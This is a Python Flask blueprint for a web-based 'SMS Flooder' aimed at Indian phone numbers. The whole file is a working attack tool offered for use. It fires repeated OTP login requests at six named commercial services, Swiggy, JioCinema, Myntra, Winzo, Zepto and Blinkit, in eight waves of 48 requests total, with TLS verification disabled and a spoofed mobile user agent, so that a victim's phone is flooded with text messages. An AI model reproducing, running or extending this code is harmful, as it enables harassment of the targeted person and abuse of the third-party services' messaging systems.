from flask import Blueprint, render_template_string, request, jsonify
import requests
import threading
import time
import logging
from concurrent.futures import ThreadPoolExecutor

script10_bp = Blueprint('script10', __name__, template_folder='templates')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# SMS Services (6 verified endpoints)
SERVICES = [
    {
        'name': 'Swiggy',
        'url': 'https://www.swiggy.com/dapi/auth/otp-login',
        'payload': lambda phone: {'phone': phone, 'os': 'android'}
    },
    {
        'name': 'JioCinema',
        'url': 'https://www.jiocinema.com/rest/auth/send-otp',
        'payload': lambda phone: {'phone': phone, 'country_code': '+91'}
    },
    {
        'name': 'Myntra',
        'url': 'https://www.myntra.com/otp/v1/send',
        'payload': lambda phone: {'login_id': phone}
    },
    {
        'name': 'Winzo',
        'url': 'https://www.winzogames.com/api/v1/user/otp',
        'payload': lambda phone: {'mobile': phone}
    },
    {
        'name': 'Zepto',
        'url': 'https://api.zeptonow.com/api/v1/auth/otp',
        'payload': lambda phone: {'phone_number': phone}
    },
    {
        'name': 'Blinkit',
        'url': 'https://www.blinkit.com/api/v1/auth/send-otp',
        'payload': lambda phone: {'phone': phone}
    }
]

def send_otp(service, phone):
    """Send single OTP request"""
    try:
        payload = service['payload'](phone)
        resp = requests.post(
            service['url'], 
            json=payload,
            headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'},
            timeout=15,
            verify=False
        )
        return resp.status_code == 200
    except:
        return False

@script10_bp.route('/script10/')
def index():
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>SMS Flooder - Script 10</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #00ff00; }
        input[type="tel"] { width: 100%; padding: 15px; font-size: 18px; border: 2px solid #00ff00; background: #000; color: #00ff00; border-radius: 5px; }
        button { width: 100%; padding: 15px; font-size: 18px; background: #ff0000; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #333; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 15px; background: #001a00; border-radius: 5px; white-space: pre-wrap; font-family: monospace; }
        .countdown { font-size: 24px; font-weight: bold; color: #ffff00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>💥 SMS FLOODER v2.0</h1>
        <p>Target: <strong>+91xxxxxxxxxx</strong></p>
        <input type="tel" id="phone" placeholder="Enter 10-digit number" maxlength="10" pattern="[0-9]{10}">
        <button onclick="startFlood()">🚀 START FLOOD (48 HITS)</button>
        <div id="status"></div>
    </div>

    <script>
        let flooding = false;
        function startFlood() {
            const phone = '91' + document.getElementById('phone').value;
            if (!phone.match(/^91[0-9]{10}$/)) return alert('Invalid number');
            
            flooding = true;
            const btn = event.target;
            btn.disabled = true;
            btn.textContent = 'FLOODING...';
            
            fetch('/script10/bomb', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('status').innerHTML = data.status;
                flooding = false;
                btn.disabled = false;
                btn.textContent = '🚀 START FLOOD (48 HITS)';
            });
        }
    </script>
</body>
</html>
    ''')

@script10_bp.route('/script10/bomb', methods=['POST'])
def bomb():
    data = request.get_json()
    phone = data.get('phone')
    
    if not phone or not phone.startswith('91'):
        return jsonify({'status': '❌ Invalid phone number'}), 400
    
    logger.info(f"🎯 BLUEPRINT FLOOD -> {phone}")
    logger.info("💥 SMS FLOOD INITIATED")
    
    hits = 0
    status_lines = []
    
    def flood_worker():
        nonlocal hits
        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = [executor.submit(send_otp, service, phone) for service in SERVICES]
            for i, future in enumerate(futures):
                if future.result():
                    hits += 1
                    service_name = SERVICES[i]['name']
                    logger.info(f"📱 [{service_name}] -> 200")
                    status_lines.append(f"✅ [{service_name}] HIT")
                time.sleep(0.5)  # Rate limit
    
    # Run 8 waves (8 * 6 = 48 total)
    for wave in range(8):
        flood_worker()
        status_lines.append(f"📊 Wave {wave+1}/8 complete | Hits: {hits}")
    
    final_status = f"""✅ FLOOD COMPLETE | {hits}/48 HITS
{chr(10).join(status_lines[-10:])}
📈 Success Rate: {(hits/48)*100:.1f}%"""
    
    logger.info(final_status)
    return jsonify({'status': final_status})
